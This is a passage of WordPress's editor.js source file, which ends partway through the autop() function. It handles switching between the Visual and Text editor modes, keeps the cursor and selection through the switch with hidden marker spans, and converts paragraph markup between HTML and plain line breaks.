/**
 * @output wp-admin/js/editor.js
 */

window.wp = window.wp || {};

( function( $, wp ) {
	wp.editor = wp.editor || {};

	/**
	 * Utility functions for the editor.
	 *
	 * @since 2.5.0
	 */
	function SwitchEditors() {
		var tinymce, $$,
			exports = {};

		function init() {
			if ( ! tinymce && window.tinymce ) {
				tinymce = window.tinymce;
				$$ = tinymce.$;

				/**
				 * Handles onclick events for the Visual/Text tabs.
				 *
				 * @since 4.3.0
				 *
				 * @return {void}
				 */
				$$( document ).on( 'click', function( event ) {
					var id, mode,
						target = $$( event.target );

					if ( target.hasClass( 'wp-switch-editor' ) ) {
						id = target.attr( 'data-wp-editor-id' );
						mode = target.hasClass( 'switch-tmce' ) ? 'tmce' : 'html';
						switchEditor( id, mode );
					}
				});
			}
		}

		/**
		 * Returns the height of the editor toolbar(s) in px.
		 *
		 * @since 3.9.0
		 *
		 * @param {Object} editor The TinyMCE editor.
		 * @return {number} If the height is between 10 and 200 return the height,
		 * else return 30.
		 */
		function getToolbarHeight( editor ) {
			var node = $$( '.mce-toolbar-grp', editor.getContainer() )[0],
				height = node && node.clientHeight;

			if ( height && height > 10 && height < 200 ) {
				return parseInt( height, 10 );
			}

			return 30;
		}

		/**
		 * Switches the editor between Visual and Text mode.
		 *
		 * @since 2.5.0
		 *
		 * @memberof switchEditors
		 *
		 * @param {string} id The id of the editor you want to change the editor mode for. Default: `content`.
		 * @param {string} mode The mode you want to switch to. Default: `toggle`.
		 * @return {void}
		 */
		function switchEditor( id, mode ) {
			id = id || 'content';
			mode = mode || 'toggle';

			var editorHeight, toolbarHeight, iframe,
				editor = tinymce.get( id ),
				wrap = $$( '#wp-' + id + '-wrap' ),
				$textarea = $$( '#' + id ),
				textarea = $textarea[0];

			if ( 'toggle' === mode ) {
				if ( editor && ! editor.isHidden() ) {
					mode = 'html';
				} else {
					mode = 'tmce';
				}
			}

			if ( 'tmce' === mode || 'tinymce' === mode ) {
				// If the editor is visible we are already in `tinymce` mode.
				if ( editor && ! editor.isHidden() ) {
					return false;
				}

				// Insert closing tags for any open tags in QuickTags.
				if ( typeof( window.QTags ) !== 'undefined' ) {
					window.QTags.closeAllTags( id );
				}

				editorHeight = parseInt( textarea.style.height, 10 ) || 0;

				var keepSelection = false;
				if ( editor ) {
					keepSelection = editor.getParam( 'wp_keep_scroll_position' );
				} else {
					keepSelection = window.tinyMCEPreInit.mceInit[ id ] &&
									window.tinyMCEPreInit.mceInit[ id ].wp_keep_scroll_position;
				}

				if ( keepSelection ) {
					// Save the selection.
					addHTMLBookmarkInTextAreaContent( $textarea );
				}

				if ( editor ) {
					editor.show();

					// No point to resize the iframe in iOS.
					if ( ! tinymce.Env.iOS && editorHeight ) {
						toolbarHeight = getToolbarHeight( editor );
						editorHeight = editorHeight - toolbarHeight + 14;

						// Sane limit for the editor height.
						if ( editorHeight > 50 && editorHeight < 5000 ) {
							editor.theme.resizeTo( null, editorHeight );
						}
					}

					if ( editor.getParam( 'wp_keep_scroll_position' ) ) {
						// Restore the selection.
						focusHTMLBookmarkInVisualEditor( editor );
					}
				} else {
					tinymce.init( window.tinyMCEPreInit.mceInit[ id ] );
				}

				wrap.removeClass( 'html-active' ).addClass( 'tmce-active' );
				$textarea.attr( 'aria-hidden', true );
				window.setUserSetting( 'editor', 'tinymce' );

			} else if ( 'html' === mode ) {
				// If the editor is hidden (Quicktags is shown) we don't need to switch.
				if ( editor && editor.isHidden() ) {
					return false;
				}

				if ( editor ) {
					// Don't resize the textarea in iOS.
					// The iframe is forced to 100% height there, we shouldn't match it.
					if ( ! tinymce.Env.iOS ) {
						iframe = editor.iframeElement;
						editorHeight = iframe ? parseInt( iframe.style.height, 10 ) : 0;

						if ( editorHeight ) {
							toolbarHeight = getToolbarHeight( editor );
							editorHeight = editorHeight + toolbarHeight - 14;

							// Sane limit for the textarea height.
							if ( editorHeight > 50 && editorHeight < 5000 ) {
								textarea.style.height = editorHeight + 'px';
							}
						}
					}

					var selectionRange = null;

					if ( editor.getParam( 'wp_keep_scroll_position' ) ) {
						selectionRange = findBookmarkedPosition( editor );
					}

					editor.hide();

					if ( selectionRange ) {
						selectTextInTextArea( editor, selectionRange );
					}
				} else {
					// There is probably a JS error on the page.
					// The TinyMCE editor instance doesn't exist. Show the textarea.
					$textarea.css({ 'display': '', 'visibility': '' });
				}

				wrap.removeClass( 'tmce-active' ).addClass( 'html-active' );
				$textarea.attr( 'aria-hidden', false );
				window.setUserSetting( 'editor', 'html' );
			}
		}

		/**
		 * Checks if a cursor is inside an HTML tag or comment.
		 *
		 * In order to prevent breaking HTML tags when selecting text, the cursor
		 * must be moved to either the start or end of the tag.
		 *
		 * This will prevent the selection marker to be inserted in the middle of an HTML tag.
		 *
		 * This function gives information whether the cursor is inside a tag or not, as well as
		 * the tag type, if it is a closing tag and check if the HTML tag is inside a shortcode tag,
		 * e.g. `[caption]<img.../>..`.
		 *
		 * @param {string} content The test content where the cursor is.
		 * @param {number} cursorPosition The cursor position inside the content.
		 *
		 * @return {(null|Object)} Null if cursor is not in a tag, Object if the cursor is inside a tag.
		 */
		function getContainingTagInfo( content, cursorPosition ) {
			var lastLtPos = content.lastIndexOf( '<', cursorPosition - 1 ),
				lastGtPos = content.lastIndexOf( '>', cursorPosition );

			if ( lastLtPos > lastGtPos || content.substr( cursorPosition, 1 ) === '>' ) {
				// Find what the tag is.
				var tagContent = content.substr( lastLtPos ),
					tagMatch = tagContent.match( /<\s*(\/)?(\w+|\!-{2}.*-{2})/ );

				if ( ! tagMatch ) {
					return null;
				}

				var tagType = tagMatch[2],
					closingGt = tagContent.indexOf( '>' );

				return {
					ltPos: lastLtPos,
					gtPos: lastLtPos + closingGt + 1, // Offset by one to get the position _after_ the character.
					tagType: tagType,
					isClosingTag: !! tagMatch[1]
				};
			}
			return null;
		}

		/**
		 * Checks if the cursor is inside a shortcode
		 *
		 * If the cursor is inside a shortcode wrapping tag, e.g. `[caption]` it's better to
		 * move the selection marker to before or after the shortcode.
		 *
		 * For example `[caption]` rewrites/removes anything that's between the `[caption]` tag and the
		 * `<img/>` tag inside.
		 *
		 * `[caption]<span>ThisIsGone</span><img .../>[caption]`
		 *
		 * Moving the selection to before or after the short code is better, since it allows to select
		 * something, instead of just losing focus and going to the start of the content.
		 *
		 * @param {string} content The text content to check against.
		 * @param {number} cursorPosition    The cursor position to check.
		 *
		 * @return {(undefined|Object)} Undefined if the cursor is not wrapped in a shortcode tag.
		 *                              Information about the wrapping shortcode tag if it's wrapped in one.
		 */
		function getShortcodeWrapperInfo( content, cursorPosition ) {
			var contentShortcodes = getShortCodePositionsInText( content );

			for ( var i = 0; i < contentShortcodes.length; i++ ) {
				var element = contentShortcodes[ i ];

				if ( cursorPosition >= element.startIndex && cursorPosition <= element.endIndex ) {
					return element;
				}
			}
		}

		/**
		 * Gets a list of unique shortcodes or shortcode-look-alikes in the content.
		 *
		 * @param {string} content The content we want to scan for shortcodes.
		 */
		function getShortcodesInText( content ) {
			var shortcodes = content.match( /\[+([\w_-])+/g ),
				result = [];

			if ( shortcodes ) {
				for ( var i = 0; i < shortcodes.length; i++ ) {
					var shortcode = shortcodes[ i ].replace( /^\[+/g, '' );

					if ( result.indexOf( shortcode ) === -1 ) {
						result.push( shortcode );
					}
				}
			}

			return result;
		}

		/**
		 * Gets all shortcodes and their positions in the content
		 *
		 * This function returns all the shortcodes that could be found in the textarea content
		 * along with their character positions and boundaries.
		 *
		 * This is used to check if the selection cursor is inside the boundaries of a shortcode
		 * and move it accordingly, to avoid breakage.
		 *
		 * @link adjustTextAreaSelectionCursors
		 *
		 * The information can also be used in other cases when we need to lookup shortcode data,
		 * as it's already structured!
		 *
		 * @param {string} content The content we want to scan for shortcodes
		 */
		function getShortCodePositionsInText( content ) {
			var allShortcodes = getShortcodesInText( content ), shortcodeInfo;

			if ( allShortcodes.length === 0 ) {
				return [];
			}

			var shortcodeDetailsRegexp = wp.shortcode.regexp( allShortcodes.join( '|' ) ),
				shortcodeMatch, // Define local scope for the variable to be used in the loop below.
				shortcodesDetails = [];

			while ( shortcodeMatch = shortcodeDetailsRegexp.exec( content ) ) {
				/**
				 * Check if the shortcode should be shown as plain text.
				 *
				 * This corresponds to the [[shortcode]] syntax, which doesn't parse the shortcode
				 * and just shows it as text.
				 */
				var showAsPlainText = shortcodeMatch[1] === '[';

				shortcodeInfo = {
					shortcodeName: shortcodeMatch[2],
					showAsPlainText: showAsPlainText,
					startIndex: shortcodeMatch.index,
					endIndex: shortcodeMatch.index + shortcodeMatch[0].length,
					length: shortcodeMatch[0].length
				};

				shortcodesDetails.push( shortcodeInfo );
			}

			/**
			 * Get all URL matches, and treat them as embeds.
			 *
			 * Since there isn't a good way to detect if a URL by itself on a line is a previewable
			 * object, it's best to treat all of them as such.
			 *
			 * This means that the selection will capture the whole URL, in a similar way shrotcodes
			 * are treated.
			 */
			var urlRegexp = new RegExp(
				'(^|[\\n\\r][\\n\\r]|<p>)(https?:\\/\\/[^\s"]+?)(<\\/p>\s*|[\\n\\r][\\n\\r]|$)', 'gi'
			);

			while ( shortcodeMatch = urlRegexp.exec( content ) ) {
				shortcodeInfo = {
					shortcodeName: 'url',
					showAsPlainText: false,
					startIndex: shortcodeMatch.index,
					endIndex: shortcodeMatch.index + shortcodeMatch[ 0 ].length,
					length: shortcodeMatch[ 0 ].length,
					urlAtStartOfContent: shortcodeMatch[ 1 ] === '',
					urlAtEndOfContent: shortcodeMatch[ 3 ] === ''
				};

				shortcodesDetails.push( shortcodeInfo );
			}

			return shortcodesDetails;
		}

		/**
		 * Generate a cursor marker element to be inserted in the content.
		 *
		 * `span` seems to be the least destructive element that can be used.
		 *
		 * Using DomQuery syntax to create it, since it's used as both text and as a DOM element.
		 *
		 * @param {Object} domLib DOM library instance.
		 * @param {string} content The content to insert into the cursor marker element.
		 */
		function getCursorMarkerSpan( domLib, content ) {
			return domLib( '<span>' ).css( {
						display: 'inline-block',
						width: 0,
						overflow: 'hidden',
						'line-height': 0
					} )
					.html( content ? content : '' );
		}

		/**
		 * Gets adjusted selection cursor positions according to HTML tags, comments, and shortcodes.
		 *
		 * Shortcodes and HTML codes are a bit of a special case when selecting, since they may render
		 * content in Visual mode. If we insert selection markers somewhere inside them, it's really possible
		 * to break the syntax and render the HTML tag or shortcode broken.
		 *
		 * @link getShortcodeWrapperInfo
		 *
		 * @param {string} content Textarea content that the cursors are in
		 * @param {{cursorStart: number, cursorEnd: number}} cursorPositions Cursor start and end positions
		 *
		 * @return {{cursorStart: number, cursorEnd: number}}
		 */
		function adjustTextAreaSelectionCursors( content, cursorPositions ) {
			var voidElements = [
				'area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input',
				'keygen', 'link', 'meta', 'param', 'source', 'track', 'wbr'
			];

			var cursorStart = cursorPositions.cursorStart,
				cursorEnd = cursorPositions.cursorEnd,
				// Check if the cursor is in a tag and if so, adjust it.
				isCursorStartInTag = getContainingTagInfo( content, cursorStart );

			if ( isCursorStartInTag ) {
				/**
				 * Only move to the start of the HTML tag (to select the whole element) if the tag
				 * is part of the voidElements list above.
				 *
				 * This list includes tags that are self-contained and don't need a closing tag, according to the
				 * HTML5 specification.
				 *
				 * This is done in order to make selection of text a bit more consistent when selecting text in
				 * `<p>` tags or such.
				 *
				 * In cases where the tag is not a void element, the cursor is put to the end of the tag,
				 * so it's either between the opening and closing tag elements or after the closing tag.
				 */
				if ( voidElements.indexOf( isCursorStartInTag.tagType ) !== -1 ) {
					cursorStart = isCursorStartInTag.ltPos;
				} else {
					cursorStart = isCursorStartInTag.gtPos;
				}
			}

			var isCursorEndInTag = getContainingTagInfo( content, cursorEnd );
			if ( isCursorEndInTag ) {
				cursorEnd = isCursorEndInTag.gtPos;
			}

			var isCursorStartInShortcode = getShortcodeWrapperInfo( content, cursorStart );
			if ( isCursorStartInShortcode && ! isCursorStartInShortcode.showAsPlainText ) {
				/**
				 * If a URL is at the start or the end of the content,
				 * the selection doesn't work, because it inserts a marker in the text,
				 * which breaks the embedURL detection.
				 *
				 * The best way to avoid that and not modify the user content is to
				 * adjust the cursor to either after or before URL.
				 */
				if ( isCursorStartInShortcode.urlAtStartOfContent ) {
					cursorStart = isCursorStartInShortcode.endIndex;
				} else {
					cursorStart = isCursorStartInShortcode.startIndex;
				}
			}

			var isCursorEndInShortcode = getShortcodeWrapperInfo( content, cursorEnd );
			if ( isCursorEndInShortcode && ! isCursorEndInShortcode.showAsPlainText ) {
				if ( isCursorEndInShortcode.urlAtEndOfContent ) {
					cursorEnd = isCursorEndInShortcode.startIndex;
				} else {
					cursorEnd = isCursorEndInShortcode.endIndex;
				}
			}

			return {
				cursorStart: cursorStart,
				cursorEnd: cursorEnd
			};
		}

		/**
		 * Adds text selection markers in the editor textarea.
		 *
		 * Adds selection markers in the content of the editor `textarea`.
		 * The method directly manipulates the `textarea` content, to allow TinyMCE plugins
		 * to run after the markers are added.
		 *
		 * @param {Object} $textarea TinyMCE's textarea wrapped as a DomQuery object
		 */
		function addHTMLBookmarkInTextAreaContent( $textarea ) {
			if ( ! $textarea || ! $textarea.length ) {
				// If no valid $textarea object is provided, there's nothing we can do.
				return;
			}

			var textArea = $textarea[0],
				textAreaContent = textArea.value,

				adjustedCursorPositions = adjustTextAreaSelectionCursors( textAreaContent, {
					cursorStart: textArea.selectionStart,
					cursorEnd: textArea.selectionEnd
				} ),

				htmlModeCursorStartPosition = adjustedCursorPositions.cursorStart,
				htmlModeCursorEndPosition = adjustedCursorPositions.cursorEnd,

				mode = htmlModeCursorStartPosition !== htmlModeCursorEndPosition ? 'range' : 'single',

				selectedText = null,
				cursorMarkerSkeleton = getCursorMarkerSpan( $$, '&#65279;' ).attr( 'data-mce-type','bookmark' );

			if ( mode === 'range' ) {
				var markedText = textArea.value.slice( htmlModeCursorStartPosition, htmlModeCursorEndPosition ),
					bookMarkEnd = cursorMarkerSkeleton.clone().addClass( 'mce_SELRES_end' );

				selectedText = [
					markedText,
					bookMarkEnd[0].outerHTML
				].join( '' );
			}

			textArea.value = [
				textArea.value.slice( 0, htmlModeCursorStartPosition ), // Text until the cursor/selection position.
				cursorMarkerSkeleton.clone()							// Cursor/selection start marker.
					.addClass( 'mce_SELRES_start' )[0].outerHTML,
				selectedText, 											// Selected text with end cursor/position marker.
				textArea.value.slice( htmlModeCursorEndPosition )		// Text from last cursor/selection position to end.
			].join( '' );
		}

		/**
		 * Focuses the selection markers in Visual mode.
		 *
		 * The method checks for existing selection markers inside the editor DOM (Visual mode)
		 * and create a selection between the two nodes using the DOM `createRange` selection API
		 *
		 * If there is only a single node, select only the single node through TinyMCE's selection API
		 *
		 * @param {Object} editor TinyMCE editor instance.
		 */
		function focusHTMLBookmarkInVisualEditor( editor ) {
			var startNode = editor.$( '.mce_SELRES_start' ).attr( 'data-mce-bogus', 1 ),
				endNode = editor.$( '.mce_SELRES_end' ).attr( 'data-mce-bogus', 1 );

			if ( startNode.length ) {
				editor.focus();

				if ( ! endNode.length ) {
					editor.selection.select( startNode[0] );
				} else {
					var selection = editor.getDoc().createRange();

					selection.setStartAfter( startNode[0] );
					selection.setEndBefore( endNode[0] );

					editor.selection.setRng( selection );
				}
			}

			if ( editor.getParam( 'wp_keep_scroll_position' ) ) {
				scrollVisualModeToStartElement( editor, startNode );
			}

			removeSelectionMarker( startNode );
			removeSelectionMarker( endNode );

			editor.save();
		}

		/**
		 * Removes selection marker and the parent node if it is an empty paragraph.
		 *
		 * By default TinyMCE wraps loose inline tags in a `<p>`.
		 * When removing selection markers an empty `<p>` may be left behind, remove it.
		 *
		 * @param {Object} $marker The marker to be removed from the editor DOM, wrapped in an instnce of `editor.$`
		 */
		function removeSelectionMarker( $marker ) {
			var $markerParent = $marker.parent();

			$marker.remove();

			//Remove empty paragraph left over after removing the marker.
			if ( $markerParent.is( 'p' ) && ! $markerParent.children().length && ! $markerParent.text() ) {
				$markerParent.remove();
			}
		}

		/**
		 * Scrolls the content to place the selected element in the center of the screen.
		 *
		 * Takes an element, that is usually the selection start element, selected in
		 * `focusHTMLBookmarkInVisualEditor()` and scrolls the screen so the element appears roughly
		 * in the middle of the screen.
		 *
		 * I order to achieve the proper positioning, the editor media bar and toolbar are subtracted
		 * from the window height, to get the proper viewport window, that the user sees.
		 *
		 * @param {Object} editor TinyMCE editor instance.
		 * @param {Object} element HTMLElement that should be scrolled into view.
		 */
		function scrollVisualModeToStartElement( editor, element ) {
			var elementTop = editor.$( element ).offset().top,
				TinyMCEContentAreaTop = editor.$( editor.getContentAreaContainer() ).offset().top,

				toolbarHeight = getToolbarHeight( editor ),

				edTools = $( '#wp-content-editor-tools' ),
				edToolsHeight = 0,
				edToolsOffsetTop = 0,

				$scrollArea;

			if ( edTools.length ) {
				edToolsHeight = edTools.height();
				edToolsOffsetTop = edTools.offset().top;
			}

			var windowHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight,

				selectionPosition = TinyMCEContentAreaTop + elementTop,
				visibleAreaHeight = windowHeight - ( edToolsHeight + toolbarHeight );

			// There's no need to scroll if the selection is inside the visible area.
			if ( selectionPosition < visibleAreaHeight ) {
				return;
			}

			/**
			 * The minimum scroll height should be to the top of the editor, to offer a consistent
			 * experience.
			 *
			 * In order to find the top of the editor, we calculate the offset of `#wp-content-editor-tools` and
			 * subtracting the height. This gives the scroll position where the top of the editor tools aligns with
			 * the top of the viewport (under the Master Bar)
			 */
			var adjustedScroll;
			if ( editor.settings.wp_autoresize_on ) {
				$scrollArea = $( 'html,body' );
				adjustedScroll = Math.max( selectionPosition - visibleAreaHeight / 2, edToolsOffsetTop - edToolsHeight );
			} else {
				$scrollArea = $( editor.contentDocument ).find( 'html,body' );
				adjustedScroll = elementTop;
			}

			$scrollArea.animate( {
				scrollTop: parseInt( adjustedScroll, 10 )
			}, 100 );
		}

		/**
		 * This method was extracted from the `SaveContent` hook in
		 * `wp-includes/js/tinymce/plugins/wordpress/plugin.js`.
		 *
		 * It's needed here, since the method changes the content a bit, which confuses the cursor position.
		 *
		 * @param {Object} event TinyMCE event object.
		 */
		function fixTextAreaContent( event ) {
			// Keep empty paragraphs :(
			event.content = event.content.replace( /<p>(?:<br ?\/?>|\u00a0|\uFEFF| )*<\/p>/g, '<p>&nbsp;</p>' );
		}

		/**
		 * Finds the current selection position in the Visual editor.
		 *
		 * Find the current selection in the Visual editor by inserting marker elements at the start
		 * and end of the selection.
		 *
		 * Uses the standard DOM selection API to achieve that goal.
		 *
		 * Check the notes in the comments in the code below for more information on some gotchas
		 * and why this solution was chosen.
		 *
		 * @param {Object} editor The editor where we must find the selection.
		 * @return {(null|Object)} The selection range position in the editor.
		 */
		function findBookmarkedPosition( editor ) {
			// Get the TinyMCE `window` reference, since we need to access the raw selection.
			var TinyMCEWindow = editor.getWin(),
				selection = TinyMCEWindow.getSelection();

			if ( ! selection || selection.rangeCount < 1 ) {
				// no selection, no need to continue.
				return;
			}

			/**
			 * The ID is used to avoid replacing user generated content, that may coincide with the
			 * format specified below.
			 * @type {string}
			 */
			var selectionID = 'SELRES_' + Math.random();

			/**
			 * Create two marker elements that will be used to mark the start and the end of the range.
			 *
			 * The elements have hardcoded style that makes them invisible. This is done to avoid seeing
			 * random content flickering in the editor when switching between modes.
			 */
			var spanSkeleton = getCursorMarkerSpan( editor.$, selectionID ),
				startElement = spanSkeleton.clone().addClass( 'mce_SELRES_start' ),
				endElement = spanSkeleton.clone().addClass( 'mce_SELRES_end' );

			/**
			 * Inspired by:
			 * @link https://stackoverflow.com/a/17497803/153310
			 *
			 * Why do it this way and not with TinyMCE's bookmarks?
			 *
			 * TinyMCE's bookmarks are very nice when working with selections and positions, BUT
			 * there is no way to determine the precise position of the bookmark when switching modes, since
			 * TinyMCE does some serialization of the content, to fix things like shortcodes, run plugins, prettify
			 * HTML code and so on. In this process, the bookmark markup gets lost.
			 *
			 * If we decide to hook right after the bookmark is added, we can see where the bookmark is in the raw HTML
			 * in TinyMCE. Unfortunately this state is before the serialization, so any visual markup in the content will
			 * throw off the positioning.
			 *
			 * To avoid this, we insert two custom `span`s that will serve as the markers at the beginning and end of the
			 * selection.
			 *
			 * Why not use TinyMCE's selection API or the DOM API to wrap the contents? Because if we do that, this creates
			 * a new node, which is inserted in the dom. Now this will be fine, if we worked with fixed selections to
			 * full nodes. Unfortunately in our case, the user can select whatever they like, which means that the
			 * selection may start in the middle of one node and end in the middle of a completely different one. If we
			 * wrap the selection in another node, this will create artifacts in the content.
			 *
			 * Using the method below, we insert the custom `span` nodes at the start and at the end of the selection.
			 * This helps us not break the content and also gives us the option to work with multi-node selections without
			 * breaking the markup.
			 */
			var range = selection.getRangeAt( 0 ),
				startNode = range.startContainer,
				startOffset = range.startOffset,
				boundaryRange = range.cloneRange();

			/**
			 * If the selection is on a shortcode with Live View, TinyMCE creates a bogus markup,
			 * which we have to account for.
			 */
			if ( editor.$( startNode ).parents( '.mce-offscreen-selection' ).length > 0 ) {
				startNode = editor.$( '[data-mce-selected]' )[0];

				/**
				 * Marking the start and end element with `data-mce-object-selection` helps
				 * discern when the selected object is a Live Preview selection.
				 *
				 * This way we can adjust the selection to properly select only the content, ignoring
				 * whitespace inserted around the selected object by the Editor.
				 */
				startElement.attr( 'data-mce-object-selection', 'true' );
				endElement.attr( 'data-mce-object-selection', 'true' );

				editor.$( startNode ).before( startElement[0] );
				editor.$( startNode ).after( endElement[0] );
			} else {
				boundaryRange.collapse( false );
				boundaryRange.insertNode( endElement[0] );

				boundaryRange.setStart( startNode, startOffset );
				boundaryRange.collapse( true );
				boundaryRange.insertNode( startElement[0] );

				range.setStartAfter( startElement[0] );
				range.setEndBefore( endElement[0] );
				selection.removeAllRanges();
				selection.addRange( range );
			}

			/**
			 * Now the editor's content has the start/end nodes.
			 *
			 * Unfortunately the content goes through some more changes after this step, before it gets inserted
			 * in the `textarea`. This means that we have to do some minor cleanup on our own here.
			 */
			editor.on( 'GetContent', fixTextAreaContent );

			var content = removep( editor.getContent() );

			editor.off( 'GetContent', fixTextAreaContent );

			startElement.remove();
			endElement.remove();

			var startRegex = new RegExp(
				'<span[^>]*\\s*class="mce_SELRES_start"[^>]+>\\s*' + selectionID + '[^<]*<\\/span>(\\s*)'
			);

			var endRegex = new RegExp(
				'(\\s*)<span[^>]*\\s*class="mce_SELRES_end"[^>]+>\\s*' + selectionID + '[^<]*<\\/span>'
			);

			var startMatch = content.match( startRegex ),
				endMatch = content.match( endRegex );

			if ( ! startMatch ) {
				return null;
			}

			var startIndex = startMatch.index,
				startMatchLength = startMatch[0].length,
				endIndex = null;

			if (endMatch) {
				/**
				 * Adjust the selection index, if the selection contains a Live Preview object or not.
				 *
				 * Check where the `data-mce-object-selection` attribute is set above for more context.
				 */
				if ( startMatch[0].indexOf( 'data-mce-object-selection' ) !== -1 ) {
					startMatchLength -= startMatch[1].length;
				}

				var endMatchIndex = endMatch.index;

				if ( endMatch[0].indexOf( 'data-mce-object-selection' ) !== -1 ) {
					endMatchIndex -= endMatch[1].length;
				}

				// We need to adjust the end position to discard the length of the range start marker.
				endIndex = endMatchIndex - startMatchLength;
			}

			return {
				start: startIndex,
				end: endIndex
			};
		}

		/**
		 * Selects text in the TinyMCE `textarea`.
		 *
		 * Selects the text in TinyMCE's textarea that's between `selection.start` and `selection.end`.
		 *
		 * For `selection` parameter:
		 * @link findBookmarkedPosition
		 *
		 * @param {Object} editor TinyMCE's editor instance.
		 * @param {Object} selection Selection data.
		 */
		function selectTextInTextArea( editor, selection ) {
			// Only valid in the text area mode and if we have selection.
			if ( ! selection ) {
				return;
			}

			var textArea = editor.getElement(),
				start = selection.start,
				end = selection.end || selection.start;

			if ( textArea.focus ) {
				// Wait for the Visual editor to be hidden, then focus and scroll to the position.
				setTimeout( function() {
					textArea.setSelectionRange( start, end );
					if ( textArea.blur ) {
						// Defocus before focusing.
						textArea.blur();
					}
					textArea.focus();
				}, 100 );
			}
		}

		// Restore the selection when the editor is initialized. Needed when the Text editor is the default.
		$( document ).on( 'tinymce-editor-init.keep-scroll-position', function( event, editor ) {
			if ( editor.$( '.mce_SELRES_start' ).length ) {
				focusHTMLBookmarkInVisualEditor( editor );
			}
		} );

		/**
		 * Replaces <p> tags with two line breaks. "Opposite" of wpautop().
		 *
		 * Replaces <p> tags with two line breaks except where the <p> has attributes.
		 * Unifies whitespace.
		 * Indents <li>, <dt> and <dd> for better readability.
		 *
		 * @since 2.5.0
		 *
		 * @memberof switchEditors
		 *
		 * @param {string} html The content from the editor.
		 * @return {string} The content with stripped paragraph tags.
		 */
		function removep( html ) {
			var blocklist = 'blockquote|ul|ol|li|dl|dt|dd|table|thead|tbody|tfoot|tr|th|td|h[1-6]|fieldset|figure',
				blocklist1 = blocklist + '|div|p',
				blocklist2 = blocklist + '|pre',
				preserve_linebreaks = false,
				preserve_br = false,
				preserve = [];

			if ( ! html ) {
				return '';
			}

			// Protect script and style tags.
			if ( html.indexOf( '<script' ) !== -1 || html.indexOf( '<style' ) !== -1 ) {
				html = html.replace( /<(script|style)[^>]*>[\s\S]*?<\/\1>/g, function( match ) {
					preserve.push( match );
					return '<wp-preserve>';
				} );
			}

			// Protect pre tags.
			if ( html.indexOf( '<pre' ) !== -1 ) {
				preserve_linebreaks = true;
				html = html.replace( /<pre[^>]*>[\s\S]+?<\/pre>/g, function( a ) {
					a = a.replace( /<br ?\/?>(\r\n|\n)?/g, '<wp-line-break>' );
					a = a.replace( /<\/?p( [^>]*)?>(\r\n|\n)?/g, '<wp-line-break>' );
					return a.replace( /\r?\n/g, '<wp-line-break>' );
				});
			}

			// Remove line breaks but keep <br> tags inside image captions.
			if ( html.indexOf( '[caption' ) !== -1 ) {
				preserve_br = true;
				html = html.replace( /\[caption[\s\S]+?\[\/caption\]/g, function( a ) {
					return a.replace( /<br([^>]*)>/g, '<wp-temp-br$1>' ).replace( /[\r\n\t]+/, '' );
				});
			}

			// Normalize white space characters before and after block tags.
			html = html.replace( new RegExp( '\\s*</(' + blocklist1 + ')>\\s*', 'g' ), '</$1>\n' );
			html = html.replace( new RegExp( '\\s*<((?:' + blocklist1 + ')(?: [^>]*)?)>', 'g' ), '\n<$1>' );

			// Mark </p> if it has any attributes.
			html = html.replace( /(<p [^>]+>.*?)<\/p>/g, '$1</p#>' );

			// Preserve the first <p> inside a <div>.
			html = html.replace( /<div( [^>]*)?>\s*<p>/gi, '<div$1>\n\n' );

			// Remove paragraph tags.
			html = html.replace( /\s*<p>/gi, '' );
			html = html.replace( /\s*<\/p>\s*/gi, '\n\n' );

			// Normalize white space chars and remove multiple line breaks.
			html = html.replace( /\n[\s\u00a0]+\n/g, '\n\n' );

			// Replace <br> tags with line breaks.
			html = html.replace( /(\s*)<br ?\/?>\s*/gi, function( match, space ) {
				if ( space && space.indexOf( '\n' ) !== -1 ) {
					return '\n\n';
				}

				return '\n';
			});

			// Fix line breaks around <div>.
			html = html.replace( /\s*<div/g, '\n<div' );
			html = html.replace( /<\/div>\s*/g, '</div>\n' );

			// Fix line breaks around caption shortcodes.
			html = html.replace( /\s*\[caption([^\[]+)\[\/caption\]\s*/gi, '\n\n[caption$1[/caption]\n\n' );
			html = html.replace( /caption\]\n\n+\[caption/g, 'caption]\n\n[caption' );

			// Pad block elements tags with a line break.
			html = html.replace( new RegExp('\\s*<((?:' + blocklist2 + ')(?: [^>]*)?)\\s*>', 'g' ), '\n<$1>' );
			html = html.replace( new RegExp('\\s*</(' + blocklist2 + ')>\\s*', 'g' ), '</$1>\n' );

			// Indent <li>, <dt> and <dd> tags.
			html = html.replace( /<((li|dt|dd)[^>]*)>/g, ' \t<$1>' );

			// Fix line breaks around <select> and <option>.
			if ( html.indexOf( '<option' ) !== -1 ) {
				html = html.replace( /\s*<option/g, '\n<option' );
				html = html.replace( /\s*<\/select>/g, '\n</select>' );
			}

			// Pad <hr> with two line breaks.
			if ( html.indexOf( '<hr' ) !== -1 ) {
				html = html.replace( /\s*<hr( [^>]*)?>\s*/g, '\n\n<hr$1>\n\n' );
			}

			// Remove line breaks in <object> tags.
			if ( html.indexOf( '<object' ) !== -1 ) {
				html = html.replace( /<object[\s\S]+?<\/object>/g, function( a ) {
					return a.replace( /[\r\n]+/g, '' );
				});
			}

			// Unmark special paragraph closing tags.
			html = html.replace( /<\/p#>/g, '</p>\n' );

			// Pad remaining <p> tags whit a line break.
			html = html.replace( /\s*(<p [^>]+>[\s\S]*?<\/p>)/g, '\n$1' );

			// Trim.
			html = html.replace( /^\s+/, '' );
			html = html.replace( /[\s\u00a0]+$/, '' );

			if ( preserve_linebreaks ) {
				html = html.replace( /<wp-line-break>/g, '\n' );
			}

			if ( preserve_br ) {
				html = html.replace( /<wp-temp-br([^>]*)>/g, '<br$1>' );
			}

			// Restore preserved tags.
			if ( preserve.length ) {
				html = html.replace( /<wp-preserve>/g, function() {
					return preserve.shift();
				} );
			}

			return html;
		}

		/**
		 * Replaces two line breaks with a paragraph tag and one line break with a <br>.
		 *
		 * Similar to `wpautop()` in formatting.php.
		 *
		 * @since 2.5.0
		 *
		 * @memberof switchEditors
		 *
		 * @param {string} text The text input.
		 * @return {string} The formatted text.
		 */
		function autop( text ) {
			var preserve_linebreaks = false,
				preserve_br = false,
				blocklist = 'table|thead|tfoot|caption|col|colgroup|tbody|tr|td|th|div|dl|dd|dt|ul|ol|li|pre' +
					'|form|map|area|blockquote|address|math|style|p|h[1-6]|hr|fieldset|legend|section' +
					'|article|aside|hgroup|header|footer|nav|figure|figcaption|details|menu|summary';

			// Normalize line breaks.
			text = text.replace( /\r\n|\r/g, '\n' );

			// Remove line breaks from <object>.
			if ( text.indexOf( '<object' ) !== -1 ) {
				text = text.replace( /<object[\s\S]+?<\/object>/g, function( a ) {
